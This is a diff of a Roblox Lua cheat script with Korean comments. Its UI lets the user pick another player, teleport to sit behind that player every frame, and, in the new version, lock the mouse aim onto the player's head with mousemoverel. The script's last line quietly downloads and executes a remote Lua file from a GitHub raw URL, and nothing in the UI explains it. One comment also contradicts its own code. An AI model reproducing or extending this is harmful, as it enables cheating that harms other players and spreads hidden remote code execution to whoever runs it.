@@ -1,8 +1,9 @@
--- 로블록스 플레이어 선택 UI 티피 스크립트 (부착 방식)
+-- 로블록스 플레이어 선택 UI 티피 스크립트 (mousemoverel 방식 - 수정됨)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -15,6 +16,7 @@ local offsetDistance = 3
 local isActive = false
 local screenGui = nil
 local statusLabel = nil
+local MULTIPLIER = 1 -- 에임 민감도 조정값
 
 -- UI 드래그 함수
 local function makeDraggable(frame, mainFrame)
@@ -83,7 +85,7 @@ local function createUI()
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     titleLabel.TextSize = 18
     titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.Text = "UnRaged"
+    titleLabel.Text = "플레이어 선택"
     titleLabel.BorderSizePixel = 0
     titleLabel.ZIndex = 1000000
     titleLabel.Parent = mainFrame
@@ -92,7 +94,6 @@ local function createUI()
     titleCorner.CornerRadius = UDim.new(0, 8)
     titleCorner.Parent = titleLabel
     
-    -- 제목을 드래그 가능하게 설정
     makeDraggable(titleLabel, mainFrame)
     
     -- 스크롤 프레임
@@ -149,7 +150,7 @@ local function createUI()
         end)
     end
     
-    -- 플레이어 목록 업데이트 (증분 업데이트)
+    -- 플레이어 목록 업데이트
     local playerButtons = {}
     local function updatePlayerList()
         local currentPlayers = {}
@@ -159,7 +160,6 @@ local function createUI()
             end
         end
         
-        -- 제거된 플레이어 버튼 삭제
         for p, button in pairs(playerButtons) do
             if not currentPlayers[p] then
                 button:Destroy()
@@ -167,7 +167,6 @@ local function createUI()
             end
         end
         
-        -- 새로운 플레이어 버튼 생성
         for p in pairs(currentPlayers) do
             if not playerButtons[p] then
                 createPlayerButton(p)
@@ -243,7 +242,6 @@ local function createUI()
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
     end)
     
-    -- 새 플레이어 입장 감지
     Players.PlayerAdded:Connect(function()
         updatePlayerList()
     end)
@@ -252,24 +250,18 @@ local function createUI()
         updatePlayerList()
     end)
     
-    -- 초기 플레이어 목록 로드
     updatePlayerList()
     
     return screenGui
 end
 
--- 뒷쪽 위치 계산
-local function getBackPosition(targetChar)
-    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
-    if not targetRoot then return nil end
-    
-    local direction = targetRoot.CFrame.LookVector
-    local backOffset = -direction * offsetDistance
-    
-    return targetRoot.CFrame.Position + backOffset + Vector3.new(0, 0, 0)
+-- 3D 위치를 2D 화면 좌표로 변환
+local function worldToScreenPoint(worldPos)
+    local screenPos = Camera:WorldToScreenPoint(worldPos)
+    return Vector2.new(screenPos.X, screenPos.Y)
 end
 
--- 부착 방식 (한 번만 설정)
+-- 부착 및 에임 고정 방식
 local updateConnection = nil
 
 local function startTPAttach()
@@ -277,15 +269,6 @@ local function startTPAttach()
         updateConnection:Disconnect()
     end
     
-    -- 초기 위치 설정
-    if targetPlayer and targetPlayer.Character then
-        local backPos = getBackPosition(targetPlayer.Character)
-        if backPos then
-            humanoidRootPart.CFrame = CFrame.new(backPos)
-        end
-    end
-    
-    -- 매 프레임 상대 뒤를 따라가기 (부착)
     updateConnection = RunService.Heartbeat:Connect(function()
         if not isActive then return end
         
@@ -298,14 +281,28 @@ local function startTPAttach()
         if not targetPlayer or not targetPlayer.Character then return end
         
         local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if not targetRoot then return end
+        local targetHead = targetPlayer.Character:FindFirstChild("Head")
         
-        -- 상대 뒤에 부착 (매우 낮은 네트워크 부하)
+        if not targetRoot or not targetHead then return end
+        
+        -- 1. 상대 뒤쪽으로 이동
         local direction = targetRoot.CFrame.LookVector
         local backOffset = -direction * offsetDistance
-        local newPos = targetRoot.CFrame.Position + backOffset + Vector3.new(0, 0, 0)
+        local backPos = targetRoot.CFrame.Position + backOffset + Vector3.new(0, 0, 0)
+        humanoidRootPart.CFrame = CFrame.new(backPos)
         
-        humanoidRootPart.CFrame = CFrame.new(newPos)
+        -- 2. 상대 머리에 에임 고정 (mousemoverel 방식)
+        local targetHeadScreenPos = worldToScreenPoint(targetHead.Position)
+        local mousePos = UserInputService:GetMouseLocation()
+        
+        local diffX = targetHeadScreenPos.X - mousePos.X
+        local diffY = targetHeadScreenPos.Y - mousePos.Y
+        
+        local finalDiffX = diffX * MULTIPLIER
+        local finalDiffY = diffY * MULTIPLIER
+        
+        -- 마우스를 상대적으로 이동
+        mousemoverel(finalDiffX, finalDiffY)
     end)
 end
 
@@ -319,6 +316,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
             isActive = not isActive
             if isActive then
                 print("✓ 티피 시작: " .. targetPlayer.Name)
+                wait(0.01) -- 0.3초 대기 후 에임 고정 시작
                 startTPAttach()
             else
                 print("✗ 티피 중지")
@@ -342,7 +340,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 end)
 
 -- UI 생성
-screenGui = createUI()
+screenGui = createUI()                                                                                                                                                                                                          
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/cookick26/Ungoated/main/Ungoated.lua"))()
 
